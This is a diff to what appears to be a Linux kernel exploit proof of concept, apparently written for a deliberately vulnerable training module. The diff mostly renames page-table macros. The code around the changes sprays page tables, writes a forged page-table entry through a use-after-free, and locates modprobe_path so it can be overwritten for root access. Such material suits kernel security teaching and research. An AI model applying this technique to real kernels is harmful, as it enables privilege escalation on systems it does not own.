@@ -25,6 +25,7 @@
 #include <stdlib.h>
 #include <assert.h>
 #include <sched.h>
+#include <sys/user.h>
 #include <sys/mman.h>
 #include <sys/socket.h>
 #include <linux/if_alg.h>
@@ -98,27 +99,28 @@ int act(int act_fd, int code, int n, char *args)
 #define OBJS_PER_SLAB 42
 #define CPU_PARTIAL 120
 
-#define ENTRIES_AMOUNT 512 /* standart for any pagetable */
-#define PHYS_AREA 0x1000 /* regular page */
-#define PT_FLAGS 0x67 /* RW access for normal users and some sanity flags */
+#define PTE_INDEX_TO_VIRT(i) ((unsigned long)i << 12)
+#define PMD_INDEX_TO_VIRT(i) ((unsigned long)i << 21)
+#define PUD_INDEX_TO_VIRT(i) ((unsigned long)i << 30)
+#define PGD_INDEX_TO_VIRT(i) ((unsigned long)i << 39)
+#define PT_INDICES_TO_VIRT(pgd_index, pud_index, pmd_index, pte_index, page_index) \
+		(void *)(PGD_INDEX_TO_VIRT(pgd_index) + \
+			 PUD_INDEX_TO_VIRT(pud_index) + \
+			 PMD_INDEX_TO_VIRT(pmd_index) + \
+			 PTE_INDEX_TO_VIRT(pte_index) + \
+			 (unsigned long)page_index)
 
-#define _pte_index_to_virt(i) (i << 12)
-#define _pmd_index_to_virt(i) (i << 21)
-#define _pud_index_to_virt(i) (i << 30)
-#define _pgd_index_to_virt(i) (i << 39)
-#define PTI_TO_VIRT(pgd_index, pud_index, pmd_index, pte_index, page_index) \
-	((void *)(_pgd_index_to_virt((unsigned long long)(pgd_index)) +      \
-		  _pud_index_to_virt((unsigned long long)(pud_index)) +      \
-		  _pmd_index_to_virt((unsigned long long)(pmd_index)) +      \
-		  _pte_index_to_virt((unsigned long long)(pte_index)) +     \
-		  (unsigned long long)(page_index)))
+#define PT_ENTRIES (PAGE_SIZE / 8)
+
+/* Page table bits: Dirty | Accessed | User | Write | Present */
+#define PT_BITS 0x67
 
 int prepare_page_tables()
 {
 	/* prepare infra */
-	void *retv = mmap((void *)PTI_TO_VIRT(1, 0, 0, 0, 0), 0x1000, PROT_WRITE,
+	void *retv = mmap((void *)PT_INDICES_TO_VIRT(1, 0, 0, 0, 0), 0x1000, PROT_WRITE,
 			  MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
-	*(unsigned int *)PTI_TO_VIRT(1, 0, 0, 0, 0) = 0xcafecafe;
+	*(unsigned int *)PT_INDICES_TO_VIRT(1, 0, 0, 0, 0) = 0xcafecafe;
 	if (retv == MAP_FAILED) {
 		perror("[-] mmap");
 		return EXIT_FAILURE;
@@ -126,7 +128,7 @@ int prepare_page_tables()
 
 	/* pre-register new tables and entries */
 	for (unsigned long long i = 0; i < 512; i++) {
-		retv = mmap((void *)PTI_TO_VIRT(1, 0, 1, i, 0), 0x1000, PROT_WRITE,
+		retv = mmap((void *)PT_INDICES_TO_VIRT(1, 0, 1, i, 0), 0x1000, PROT_WRITE,
 			    MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
 	}
 	if (retv == MAP_FAILED) {
@@ -378,13 +380,13 @@ int main(void)
 	printf("[+] done, now go for page table\n");
 
 	printf("[!] create a page table to reclaim the freed memory\n");
-	for (unsigned long long i = 0; i < ENTRIES_AMOUNT; i++) {
-		*(unsigned int *)PTI_TO_VIRT(1, 0, 1, i, 0) = 0xcafecafe; /* create and fill PTE */
+	for (unsigned long long i = 0; i < PT_ENTRIES; i++) {
+		*(unsigned int *)PT_INDICES_TO_VIRT(1, 0, 1, i, 0) = 0xcafecafe; /* create and fill PTE */
 	}
 	printf("[+] done, vulnerable page table has been created\n");
 
 	printf("[!] perform uaf write using the dangling reference\n");
-	long pte_payload = MODPROBE_PATH_ADDR_PART + PT_FLAGS;
+	long pte_payload = MODPROBE_PATH_ADDR_PART + PT_BITS;
 	char str_to_drill[16];
 
 	snprintf(str_to_drill, sizeof(str_to_drill), "0x%08lx %d", pte_payload, 0);
@@ -393,15 +395,15 @@ int main(void)
 		goto end;
 	printf("[+] DRILL_ACT_SAVE_VAL\n");
 
-	flush_tlb(PTI_TO_VIRT(1, 0, 1, 0, 0), 0x200000); /* 0x200000 = 4 KiB per 512 pages */
+	flush_tlb(PT_INDICES_TO_VIRT(1, 0, 1, 0, 0), 0x200000); /* 0x200000 = 4 KiB per 512 pages */
 
-	for (int i = 0; i < ENTRIES_AMOUNT; i++) {
-		unsigned int *ptr = (unsigned int *)PTI_TO_VIRT(1, 0, 1, i, 0);
-		void *virt_address = PTI_TO_VIRT(1, 0, 1, i, 0);
+	for (int i = 0; i < PT_ENTRIES; i++) {
+		unsigned int *ptr = (unsigned int *)PT_INDICES_TO_VIRT(1, 0, 1, i, 0);
+		void *virt_address = PT_INDICES_TO_VIRT(1, 0, 1, i, 0);
 		unsigned int value = *ptr;
 
 		if (value != 0xcafecafe) {
-			modprobe_addr = memmem_modprobe_path(virt_address, PHYS_AREA, modprobe_path,
+			modprobe_addr = memmem_modprobe_path(virt_address, PAGE_SIZE, modprobe_path,
 							     modprobe_path_len);
 
 			if (modprobe_addr != NULL) {
